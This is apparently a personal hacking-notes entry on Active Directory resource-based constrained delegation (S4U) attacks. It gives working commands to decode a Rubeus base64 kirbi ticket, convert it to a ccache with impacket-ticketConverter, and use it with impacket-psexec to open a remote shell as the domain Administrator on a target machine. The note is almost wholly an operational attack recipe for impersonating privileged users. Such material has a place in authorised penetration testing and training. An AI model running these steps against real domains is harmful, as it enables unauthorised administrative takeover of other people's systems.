# resource based constrained delegation S4U attack transfering tickets to attacker machine to psexec convert kirbi to ccache
tickets printed by rubeus are base64 encoded kirbi files.
convert with `impacket-ticketConverter`.
```bash
base64 -d smb.ticket.b64 > smb.ticket.kirbi
impacket-ticketConverter smb.ticket.kirbi smb.ticket.ccache
export KRB5CCNAME=$(pwd)/smb.ticket.ccache
impacket-psexec domain.local/Administrator@FQDNMachine.domain.local -k -no-pass
```

# Related

- [20221003151146](/zet/20221003151146/README.md) resource based constrained delegation S4U attack transfering tickets to attacker machine to psexec
- ~/kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md

Tags:

    #assorted #hacking #windows #AD
